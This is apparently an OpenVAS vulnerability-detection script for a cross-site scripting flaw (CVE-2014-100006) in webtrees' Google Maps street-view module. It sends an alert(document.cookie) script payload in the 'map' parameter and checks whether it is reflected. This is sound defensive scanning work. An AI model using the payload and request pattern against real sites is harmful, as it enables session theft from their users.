if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805140" );
	script_version( "2020-10-29T15:35:19+0000" );
	script_cve_id( "CVE-2014-100006" );
	script_bugtraq_id( 65517 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-10-29 15:35:19 +0000 (Thu, 29 Oct 2020)" );
	script_tag( name: "creation_date", value: "2015-02-18 15:28:52 +0530 (Wed, 18 Feb 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Webtrees wt_v3_street_view.php Cross-site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Webtrees and
  is prone to an XSS vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to the modules_v3/googlemap/
  wt_v3_street_view.php script does not validate input to the 'map' parameter
  before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "webtrees version before 1.5.2" );
	script_tag( name: "solution", value: "Update to version 1.5.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/91133" );
	script_xref( name: "URL", value: "http://www.rusty-ice.de/advisory/advisory_2014001.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.webtrees.net/index.php/en" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/webtrees", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/index.php" ), port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(ContainsString( rcvRes, "WT_SESSION" )){
		cookie = eregmatch( pattern: "Set-Cookie: WT_SESSION=([0-9a-z]*);", string: rcvRes );
		if(!cookie[1]){
			exit( 0 );
		}
	}
	useragent = http_get_user_agent();
	url = dir + "/login.php?url=index.php%3F";
	sndReq = NASLString( "GET ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "User-Agent: ", useragent, "r\n", "Cookie: WT_SESSION=", cookie[1], "\r\n\r\n" );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(ContainsString( rcvRes, "webtrees" ) && ContainsString( rcvRes, ">Login<" )){
		url = dir + "/modules_v3/googlemap/wt_v3_street_view.php?map=" + "\"><script>alert(document.cookie)</script> ; b=\"";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: "toggleStreetView" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );
